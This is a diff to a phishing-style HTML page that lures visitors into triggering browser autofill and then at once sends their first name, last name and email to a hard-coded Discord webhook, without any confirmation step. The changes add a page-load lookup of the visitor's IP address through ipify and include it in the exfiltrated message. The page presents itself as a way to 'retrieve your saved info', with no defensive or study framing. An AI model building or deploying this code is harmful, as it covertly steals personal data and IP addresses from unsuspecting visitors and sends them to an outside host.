@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Quick Autofill and Submit</title>
+  <title>Autofill and Auto-Submit</title>
 </head>
 <body>
   <h1>Retrieve Your Saved Info</h1>
   <p id="trigger" style="cursor:pointer; color:blue; text-decoration:underline;">
-    Click here to autofill your details
+    Click here to show the form
   </p>
 
   <div id="formContainer" style="display:none;">
-    <p>Please click in the fields if needed. Once autofill occurs on any field, we'll submit the data immediately.</p>
+    <p>Click into one of the fields below and select your saved autofill suggestion. Once selected, the data will be sent automatically.</p>
     <form id="userForm" autocomplete="on">
       <label for="fname">First Name:</label>
       <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>
@@ -26,7 +26,7 @@
   </div>
 
   <script>
-    // Discord webhook provided by the user
+    // Provided Discord webhook
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
     const trigger = document.getElementById('trigger');
@@ -35,15 +35,28 @@
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
 
+    let userIP = 'Unknown IP';
+
+    // Fetch the user's IP on page load
+    window.addEventListener('load', () => {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip;
+          console.log('Fetched IP:', userIP);
+        })
+        .catch(err => console.error('Error fetching IP:', err));
+    });
+
     // Show the form when the user clicks the trigger text
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
-      // Focus the first field to prompt the browser to offer autofill
+      // Focus the first field to encourage autofill suggestions
       fnameField.focus();
     });
 
     function checkFields() {
-      // Submit as soon as any one field has a value
+      // If at least one field has a value, submit immediately
       if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
         submitForm(
           fnameField.value.trim() || '[No First Name]',
@@ -54,7 +67,8 @@
     }
 
     function submitForm(fname, lname, email) {
-      const message = `**Autofilled Submission (at least one field):**\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+      const message = `**Autofilled Submission:**\n**IP:** ${userIP}\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -71,7 +85,7 @@
     }
 
     // Listen for input and change events on all fields.
-    // As soon as one field gets filled (by autofill or user input), we submit.
+    // Once a field is populated (likely via autofill selection), we submit immediately.
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
